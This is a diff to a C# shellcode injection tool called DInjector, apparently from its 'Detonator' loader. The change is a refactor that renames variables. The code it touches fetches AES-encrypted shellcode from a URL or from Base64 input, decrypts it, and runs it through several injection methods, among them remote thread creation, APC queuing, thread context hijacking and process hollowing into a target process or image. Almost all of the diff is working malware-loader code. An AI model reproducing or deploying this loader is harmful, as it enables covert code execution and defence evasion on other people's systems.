@@ -69,7 +69,7 @@ namespace DInjector
             var shellcodePath = options["/sc"];
             var password = options["/password"];
 
-            byte[] shellcodeBytesEnc;
+            byte[] shellcodeEncrypted;
             if (shellcodePath.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
             {
                 Console.WriteLine("(Detonator) [*] Loading sc from URL");
@@ -77,47 +77,52 @@ namespace DInjector
                 ServicePointManager.SecurityProtocol = System.Net.SecurityProtocolType.Tls | (SecurityProtocolType)768 | (SecurityProtocolType)3072;
                 MemoryStream ms = new MemoryStream(wc.DownloadData(shellcodePath));
                 BinaryReader br = new BinaryReader(ms);
-                shellcodeBytesEnc = br.ReadBytes(Convert.ToInt32(ms.Length));
+                shellcodeEncrypted = br.ReadBytes(Convert.ToInt32(ms.Length));
             }
             else
             {
                 Console.WriteLine("(Detonator) [*] Loading sc from Base64 input");
-                shellcodeBytesEnc = Convert.FromBase64String(shellcodePath);
+                shellcodeEncrypted = Convert.FromBase64String(shellcodePath);
             }
 
             AES ctx = new AES(password);
-            var shellcodeBytesDec = ctx.Decrypt(shellcodeBytesEnc);
+            var shellcodeBytes = ctx.Decrypt(shellcodeEncrypted);
 
             switch (commandName)
             {
                 case "functionpointer":
-                    FunctionPointer.Execute(shellcodeBytesDec);
+                    FunctionPointer.Execute(shellcodeBytes);
                     break;
                 case "functionpointerv2":
-                    FunctionPointerV2.Execute(shellcodeBytesDec);
+                    FunctionPointerV2.Execute(shellcodeBytes);
                     break;
                 case "currentthread":
-                    CurrentThread.Execute(shellcodeBytesDec);
+                    CurrentThread.Execute(shellcodeBytes);
                     break;
                 case "remotethread":
-                    var processID = int.Parse(options["/pid"]);
-                    RemoteThread.Execute(shellcodeBytesDec, processID);
+                    RemoteThread.Execute(
+                        shellcodeBytes,
+                        int.Parse(options["/pid"]));
                     break;
                 case "remotethreadsuspended":
-                    var processIDSuspended = int.Parse(options["/pid"]);
-                    RemoteThreadSuspended.Execute(shellcodeBytesDec, processIDSuspended);
+                    RemoteThreadSuspended.Execute(
+                        shellcodeBytes,
+                        int.Parse(options["/pid"]));
                     break;
                 case "remotethreadapc":
-                    var processImageAPC = options["/image"];
-                    RemoteThreadAPC.Execute(shellcodeBytesDec, processImageAPC);
+                    RemoteThreadAPC.Execute(
+                        shellcodeBytes,
+                        options["/image"]);
                     break;
                 case "remotethreadcontext":
-                    var processImageContext = options["/image"];
-                    RemoteThreadContext.Execute(shellcodeBytesDec, processImageContext);
+                    RemoteThreadContext.Execute(
+                        shellcodeBytes,
+                        options["/image"]);
                     break;
                 case "processhollow":
-                    var processImageHollow = options["/image"];
-                    ProcessHollow.Execute(shellcodeBytesDec, processImageHollow);
+                    ProcessHollow.Execute(
+                        shellcodeBytes,
+                        options["/image"]);
                     break;
             }
         }
